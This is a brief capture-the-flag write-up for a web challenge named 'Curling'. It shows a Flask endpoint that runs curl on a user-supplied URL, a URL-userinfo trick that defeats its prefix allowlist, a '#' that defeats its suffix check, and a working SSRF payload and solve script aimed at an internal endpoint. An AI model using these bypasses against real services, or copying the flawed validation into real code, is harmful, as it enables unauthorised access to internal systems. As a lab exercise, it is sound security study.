# Curling
Challenge involve crafting a url with a specific prefix and avoid a specific suffix


## Solve
we need to get to the /test/internal endpoint, which is only accessible with localy. the curl endpoint require our url form data to be a url that starts with `http://dreamhack.io` and NOT end with `/test/internal`

```python
@app.route("/api/v1/test/curl", methods=["POST"])
def admin():
    url = request.form["url"].strip()
    for host in ALLOWED_HOSTS:
        if url.startswith('http://' + host):
            break

        return {'result': False, 'msg': 'Not Allowed host'}
    
    if url.endswith('/test/internal'):
        return {'result': False, 'msg': 'Not Allowed endpoint'}

    print(url)
    response = run(
        ["curl", f"{url}"], capture_output=True, text=True, timeout=1
    )
```

### Bypass the prefix check
A url can be writen like this:
**http://user:password@example.com/**
send username=user and password=password to example.com.

### Bypass the suffix check
We can simply add a `#` char to bypass

### Payload
To get the flag, our url should be like this:
```plain
http://dreamhack.io:pass@localhost:8000/api/v1/test/internal#
```

## Solve script
```python
import requests

url = 'http://game.site/'
data = {'url': 'http://dreamhack.io:pass@localhost:8000/api/v1/test/internal#'}

resp = requests.post(url + '/api/v1/test/curl', data=data)
print(resp.text)
```
